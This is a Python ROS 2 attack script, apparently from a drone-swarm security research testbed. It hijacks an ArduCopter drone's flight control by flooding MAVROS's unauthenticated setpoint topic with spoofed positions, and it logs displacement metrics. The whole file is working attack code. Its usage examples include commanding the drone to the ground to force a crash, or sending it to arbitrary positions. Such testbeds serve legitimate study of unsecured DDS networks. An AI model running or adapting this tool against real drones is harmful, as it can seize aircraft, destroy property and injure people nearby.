#!/usr/bin/env python3
"""
Layer 2 Attack: Setpoint Hijacking — Direct Flight Control Override

Publishes competing PoseStamped setpoints to MAVROS's setpoint_position/local
topic at a higher rate than the legitimate waypoint navigator. ArduCopter in
GUIDED mode follows the most recent setpoint — it does not authenticate the
source. The attacker can command the drone to fly anywhere: into the ground,
into walls, or away from the mission area.

Attacker model: network participant that can PUBLISH to any DDS topic
(SROS2 disabled). No interception or reconfiguration required. The attacker
only needs to know the target drone's MAVROS topic namespace.

Attack phases:
  1. Baseline (configurable) — monitor drone position, no interference
  2. Attack (configurable) — publish hijacked setpoints at high rate
  3. Recovery (configurable) — stop publishing, observe drone behaviour

The attack target position can be:
  - Fixed: fly to a specific (x, y, z) in the local frame
  - Offset: shift the drone's current position by (dx, dy, dz)
  - Ground: command z=0 to force landing/crash

Usage:
  # Command drone to fly to the ground (crash)
  ros2 run swarm_mission setpoint_hijacker --ros-args \
    -p target_drone:=drone1 \
    -p mode:=ground

  # Command drone to fly to a specific position
  ros2 run swarm_mission setpoint_hijacker --ros-args \
    -p target_drone:=drone1 \
    -p mode:=fixed \
    -p target_x:=10.0 -p target_y:=5.0 -p target_z:=3.0

  # Offset the drone from its current position
  ros2 run swarm_mission setpoint_hijacker --ros-args \
    -p target_drone:=drone1 \
    -p mode:=offset \
    -p offset_x:=5.0 -p offset_y:=3.0 -p offset_z:=0.0

Output:
  - CSV: ~/setpoint_hijack_metrics_<drone>_<timestamp>.csv
"""
import csv
import math
import os
import time
from datetime import datetime

import rclpy
from rclpy.node import Node
from rclpy.qos import QoSProfile, ReliabilityPolicy, HistoryPolicy, DurabilityPolicy
from geometry_msgs.msg import PoseStamped
from sensor_msgs.msg import Imu


class SetpointHijacker(Node):
    def __init__(self):
        super().__init__('setpoint_hijacker')

        # ---- Parameters ----
        self.declare_parameter('target_drone', 'drone1')
        self.declare_parameter('mode', 'ground')         # ground | fixed | offset
        self.declare_parameter('target_x', 0.0)
        self.declare_parameter('target_y', 0.0)
        self.declare_parameter('target_z', 0.0)
        self.declare_parameter('offset_x', 5.0)
        self.declare_parameter('offset_y', 0.0)
        self.declare_parameter('offset_z', 0.0)
        self.declare_parameter('hijack_rate', 50.0)      # Hz — must beat navigator's 20 Hz
        self.declare_parameter('baseline_duration', 10.0)
        self.declare_parameter('attack_duration', 30.0)
        self.declare_parameter('recovery_duration', 20.0)
        self.declare_parameter('output_dir', os.path.expanduser('~'))

        self.target_drone = self.get_parameter('target_drone').value
        self.mode = self.get_parameter('mode').value
        self.target_x = self.get_parameter('target_x').value
        self.target_y = self.get_parameter('target_y').value
        self.target_z = self.get_parameter('target_z').value
        self.offset_x = self.get_parameter('offset_x').value
        self.offset_y = self.get_parameter('offset_y').value
        self.offset_z = self.get_parameter('offset_z').value
        self.hijack_rate = self.get_parameter('hijack_rate').value
        self.baseline_dur = self.get_parameter('baseline_duration').value
        self.attack_dur = self.get_parameter('attack_duration').value
        self.recovery_dur = self.get_parameter('recovery_duration').value
        self.output_dir = self.get_parameter('output_dir').value

        # ---- Topics ----
        if self.target_drone == 'drone1':
            self.setpoint_topic = '/mavros/setpoint_position/local'
            self.local_pos_topic = '/mavros/local_position/pose'
            self.imu_topic = '/drone1/imu/data'
        else:
            self.setpoint_topic = f'/{self.target_drone}/mavros/setpoint_position/local'
            self.local_pos_topic = f'/{self.target_drone}/mavros/local_position/pose'
            self.imu_topic = f'/{self.target_drone}/imu/data'

        # ---- State ----
        self.phase = 'baseline'
        self.phase_start_time = None
        self.drone_pose = None           # current EKF position
        self.attack_origin = None        # drone position when attack started
        self.latest_imu_stamp = None     # sim-time timestamp from IMU
        self.hijack_timer = None
        self.hijack_count = 0

        # Metrics
        self.metrics = []
        self.metric_interval = 1.0
        self.last_metric_time = 0.0

        # ---- QoS ----
        qos_besteffort = QoSProfile(
            reliability=ReliabilityPolicy.BEST_EFFORT,
            history=HistoryPolicy.KEEP_LAST,
            durability=DurabilityPolicy.VOLATILE,
            depth=5)

        # ---- Subscribers ----
        self.pose_sub = self.create_subscription(
            PoseStamped, self.local_pos_topic,
            self.pose_callback, qos_besteffort)

        self.imu_sub = self.create_subscription(
            Imu, self.imu_topic,
            self.imu_callback, qos_besteffort)

        # ---- Publisher (the attack) ----
        self.setpoint_pub = self.create_publisher(
            PoseStamped, self.setpoint_topic, 10)

        # ---- Phase timer ----
        self.phase_timer = self.create_timer(0.5, self.phase_tick)

        # ---- CSV ----
        timestamp_str = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.csv_path = os.path.join(
            self.output_dir,
            f'setpoint_hijack_metrics_{self.target_drone}_{timestamp_str}.csv')

        mode_desc = {
            'ground': f'GROUND (z=0.5, forced landing)',
            'fixed': f'FIXED ({self.target_x}, {self.target_y}, {self.target_z})',
            'offset': f'OFFSET (+{self.offset_x}, +{self.offset_y}, +{self.offset_z})',
        }.get(self.mode, self.mode)

        self.get_logger().info(
            f'=== Setpoint Hijacking Attack ===\n'
            f'  Target: {self.target_drone}\n'
            f'  Setpoint topic: {self.setpoint_topic}\n'
            f'  Mode: {mode_desc}\n'
            f'  Hijack rate: {self.hijack_rate} Hz '
            f'(navigator runs at 20 Hz)\n'
            f'  Phases: baseline={self.baseline_dur}s, '
            f'attack={self.attack_dur}s, recovery={self.recovery_dur}s\n'
            f'  CSV: {self.csv_path}\n'
            f'  Starting BASELINE phase...')

        self.phase_start_time = time.monotonic()

    # ---- Callbacks ----

    def pose_callback(self, msg: PoseStamped):
        self.drone_pose = msg.pose

    def imu_callback(self, msg: Imu):
        self.latest_imu_stamp = msg.header.stamp

    # ---- Hijack publishing ----

    def publish_hijack(self):
        """Publish the hijacked setpoint."""
        if self.drone_pose is None or self.latest_imu_stamp is None:
            return

        msg = PoseStamped()
        msg.header.stamp = self.latest_imu_stamp  # sim time
        msg.header.frame_id = 'map'

        if self.mode == 'ground':
            # Command to current x,y but z=0.5 — forces descent/crash
            msg.pose.position.x = self.drone_pose.position.x
            msg.pose.position.y = self.drone_pose.position.y
            msg.pose.position.z = 0.5
        elif self.mode == 'fixed':
            msg.pose.position.x = self.target_x
            msg.pose.position.y = self.target_y
            msg.pose.position.z = self.target_z
        elif self.mode == 'offset':
            if self.attack_origin is not None:
                msg.pose.position.x = self.attack_origin.position.x + self.offset_x
                msg.pose.position.y = self.attack_origin.position.y + self.offset_y
                msg.pose.position.z = self.attack_origin.position.z + self.offset_z
            else:
                return

        # Keep current orientation
        msg.pose.orientation = self.drone_pose.orientation

        self.setpoint_pub.publish(msg)
        self.hijack_count += 1

    # ---- Phase management ----

    def phase_tick(self):
        now = time.monotonic()
        elapsed = now - self.phase_start_time

        # Compute displacement from attack origin
        displacement = None
        if self.attack_origin is not None and self.drone_pose is not None:
            dx = self.drone_pose.position.x - self.attack_origin.position.x
            dy = self.drone_pose.position.y - self.attack_origin.position.y
            dz = self.drone_pose.position.z - self.attack_origin.position.z
            displacement = math.sqrt(dx**2 + dy**2 + dz**2)

        # Log metrics
        if now - self.last_metric_time >= self.metric_interval:
            self.last_metric_time = now

            metric = {
                'timestamp': datetime.now().isoformat(),
                'phase': self.phase,
                'phase_elapsed_s': round(elapsed, 2),
                'hijack_count': self.hijack_count,
                'displacement_m': round(displacement, 3) if displacement is not None else None,
            }

            if self.drone_pose is not None:
                metric['drone_x'] = round(self.drone_pose.position.x, 3)
                metric['drone_y'] = round(self.drone_pose.position.y, 3)
                metric['drone_z'] = round(self.drone_pose.position.z, 3)

            self.metrics.append(metric)

            phase_char = {
                'baseline': '[B]',
                'attack': '[A]',
                'recovery': '[R]',
            }.get(self.phase, '[?]')

            pos_str = ''
            if self.drone_pose is not None:
                pos_str = (f'pos: ({self.drone_pose.position.x:.1f}, '
                           f'{self.drone_pose.position.y:.1f}, '
                           f'{self.drone_pose.position.z:.1f})')

            disp_str = f'disp: {displacement:.2f}m' if displacement is not None else ''

            self.get_logger().info(
                f'{phase_char} {elapsed:.0f}s | {pos_str} | '
                f'{disp_str} | hijacked: {self.hijack_count}')

        # Phase transitions
        if self.phase == 'baseline' and elapsed >= self.baseline_dur:
            self._start_attack()
        elif self.phase == 'attack' and elapsed >= self.attack_dur:
            self._start_recovery()
        elif self.phase == 'recovery' and elapsed >= self.recovery_dur:
            self._finish()

    def _start_attack(self):
        self.phase = 'attack'
        self.phase_start_time = time.monotonic()

        # Record where the drone was when attack started
        if self.drone_pose is not None:
            self.attack_origin = PoseStamped().pose
            self.attack_origin.position.x = self.drone_pose.position.x
            self.attack_origin.position.y = self.drone_pose.position.y
            self.attack_origin.position.z = self.drone_pose.position.z
            self.attack_origin.orientation = self.drone_pose.orientation

        # Start hijacking at high rate
        period = 1.0 / self.hijack_rate
        self.hijack_timer = self.create_timer(period, self.publish_hijack)

        self.get_logger().warn(
            f'=== ATTACK PHASE — Hijacking setpoints at {self.hijack_rate} Hz ===\n'
            f'  Mode: {self.mode}\n'
            f'  Origin: ({self.drone_pose.position.x:.1f}, '
            f'{self.drone_pose.position.y:.1f}, '
            f'{self.drone_pose.position.z:.1f})'
            if self.drone_pose else '')

    def _start_recovery(self):
        self.phase = 'recovery'
        self.phase_start_time = time.monotonic()

        # Stop hijacking
        if self.hijack_timer is not None:
            self.hijack_timer.cancel()
            self.destroy_timer(self.hijack_timer)
            self.hijack_timer = None

        self.get_logger().warn(
            f'=== RECOVERY PHASE — Hijacking stopped ===')

    def _finish(self):
        self.phase = 'done'
        self.phase_timer.cancel()

        self._write_csv()

        # Compute summary
        baseline_pos = [(m['drone_x'], m['drone_y'], m['drone_z'])
                        for m in self.metrics
                        if m['phase'] == 'baseline' and 'drone_x' in m]
        attack_displacements = [m['displacement_m'] for m in self.metrics
                                if m['phase'] == 'attack'
                                and m['displacement_m'] is not None]
        recovery_displacements = [m['displacement_m'] for m in self.metrics
                                  if m['phase'] == 'recovery'
                                  and m['displacement_m'] is not None]

        max_disp = max(attack_displacements) if attack_displacements else 0
        final_disp = attack_displacements[-1] if attack_displacements else 0
        recovery_final = recovery_displacements[-1] if recovery_displacements else 0

        # Check if altitude dropped (ground mode success indicator)
        min_z = None
        for m in self.metrics:
            if m['phase'] == 'attack' and 'drone_z' in m:
                if min_z is None or m['drone_z'] < min_z:
                    min_z = m['drone_z']

        min_z_str = f'{min_z:>6.2f}m' if min_z is not None else '  N/A '

        self.get_logger().warn(
            f'\n'
            f'╔═══════════════════════════════════════════╗\n'
            f'║      SETPOINT HIJACKING ATTACK RESULTS    ║\n'
            f'╠═══════════════════════════════════════════╣\n'
            f'║ Target: {self.target_drone:<34}║\n'
            f'║ Mode: {self.mode:<36}║\n'
            f'║ Hijack rate:          {self.hijack_rate:>6.1f} Hz           ║\n'
            f'║ Total hijacked msgs:  {self.hijack_count:>6d}              ║\n'
            f'║ Max displacement:     {max_disp:>6.2f}m             ║\n'
            f'║ Final attack disp:    {final_disp:>6.2f}m             ║\n'
            f'║ Min altitude (attack):{min_z_str}             ║\n'
            f'║ Recovery displacement:{recovery_final:>6.2f}m             ║\n'
            f'╚═══════════════════════════════════════════╝\n'
            f'\n'
            f'CSV saved: {self.csv_path}')

    def _write_csv(self):
        if not self.metrics:
            return
        fieldnames = ['timestamp', 'phase', 'phase_elapsed_s', 'hijack_count',
                      'displacement_m', 'drone_x', 'drone_y', 'drone_z']
        try:
            with open(self.csv_path, 'w', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=fieldnames,
                                        extrasaction='ignore')
                writer.writeheader()
                writer.writerows(self.metrics)
            self.get_logger().info(f'Wrote {len(self.metrics)} rows to {self.csv_path}')
        except Exception as e:
            self.get_logger().error(f'Failed to write CSV: {e}')


def main(args=None):
    rclpy.init(args=args)
    node = SetpointHijacker()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        if node.phase != 'done':
            node.get_logger().warn('Interrupted — writing partial metrics...')
            node._write_csv()
        node.get_logger().info(
            f'Shutting down — {node.hijack_count} setpoints hijacked')
    finally:
        if node.hijack_timer is not None:
            node.hijack_timer.cancel()
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
